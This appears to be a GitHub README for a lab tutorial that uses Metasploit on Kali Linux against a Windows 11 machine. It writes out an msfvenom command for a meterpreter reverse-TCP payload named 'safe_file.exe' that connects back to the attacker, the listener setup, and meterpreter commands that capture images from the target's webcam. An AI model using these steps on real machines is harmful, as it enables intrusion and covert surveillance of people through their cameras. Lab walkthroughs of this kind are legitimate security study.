<h1> Metasploit - Reverse Shell Tutorial</h1>

 ### [YouTube Demonstration](https://youtu.be/sh0AUBFdQQE) Easy Walkthrough

<h2>Description</h2>
🔒 Explore a project which practically demonstrates exploiting a Windows 11 vulnerability using Metasploit to gain webcam access and establish a reverse shell payload. This repository showcases the exploit code and demonstrates its execution step-by-step. Dive into the world of cybersecurity with this educational project. 
<br />
<br />
<h2>Languages and Utilities Used</h2>
 - <b>Metasploit</b>
<h2>Environments Used </h2>
- <b>Kali Linux</b> 
<br />
- <b>Windows 11</b> 
<br />



<h2>Program walk-through:</h2>

<p align="center">

Launch the Terminal: <br/>
<img src="https://i.imgur.com/1q88XYz.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
<br />
Find windows/x64/meterpreter_reverse_tcp:  <br/>
<img src="https://i.imgur.com/9OXqG5n.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
<br />
Create the payload using msfvenom. <br /> Commnad = "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= <your attacking machines IP address> lport=4242 (your preferred port) <br />-f exe -o safe_file.exe": <br/>
<img src="https://i.imgur.com/gYbl7xu.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
<br />
Launch metasploit framework & get set up using your desired Payload along with <br />your attacking IP address, Port & set the listener:
<img src="https://i.imgur.com/uFiqNxm.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
<br />
Transport your payload (safe_file) to the Target machine (Windows) & EXECUTE!:  <br/>
<img src="https://i.imgur.com/B1k9R6L.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
<br />
Metasploit Listener has caught the Reverseshell:  <br/>
<img src="https://i.imgur.com/wGdePzq.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
<br />
Once we have access to the targets machine, we can access all sorts of information. In this case, I will run the <br />command = "webcam_list" to see if there are any avaliable webcams we can capture from:  <br/>
<img src="https://i.imgur.com/DqHcUYk.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
There are two webcams we can access on the target machine. We will now run the command "webcam_snap -i 1" to <br />
select webcam 1 and capture an image:  <br/>
<img src="https://i.imgur.com/V84fQAN.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />
<br />
And there we have it, we have gained access to the targets webcam: <br/>
<img src="https://i.imgur.com/cwzAXW9.png" height="80%" width="80%" alt="ReverseShell Steps"/>
<br />


</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
<!--

# Metasploit Reverse Shell Tutorial

Welcome to the Metasploit Reverse Shell Tutorial! This tutorial is designed to help you understand how to create and use a reverse shell payload using Metasploit, a popular penetration testing framework.

## What is a Reverse Shell?

A reverse shell is a type of shell where the target machine initiates the connection to the attacker's machine. This allows the attacker to gain shell access to the target system, enabling them to execute commands remotely.

## Prerequisites

Before proceeding with this tutorial, make sure you have the following prerequisites installed:
- Metasploit Framework
- Kali Linux or any other Linux distribution with Metasploit installed
- Basic knowledge of command-line interface (CLI) and networking concepts

## Usage

1. **Generate Payload:** Use Metasploit to generate a reverse shell payload. You can customise the payload according to your requirements, such as the target platform and listening IP/port.
   
2. **Set Up Listener:** Start a listener on your machine to receive the incoming connection from the target. Make sure to specify the same IP and port as used in the payload.

3. **Execute Payload:** Execute the generated payload on the target system. Once executed, the target machine will establish a connection to your listener, providing you with a shell session.

4. **Explore and Control:** Once the connection is established, you'll have shell access to the target system. You can now execute commands, transfer files, or perform various tasks as per your requirement.

## Disclaimer

This tutorial is for educational purposes only. Do not use the techniques described herein for any malicious purposes. I am not responsible for any damage caused by the misuse of the information provided in this tutorial.

## Contributing

If you find any issues or have suggestions for improvement, feel free to open an issue or submit a pull request.

-->

## Licence

This project is licensed under the MIT Licence - see the [LICENSE](LICENSE) file for details.
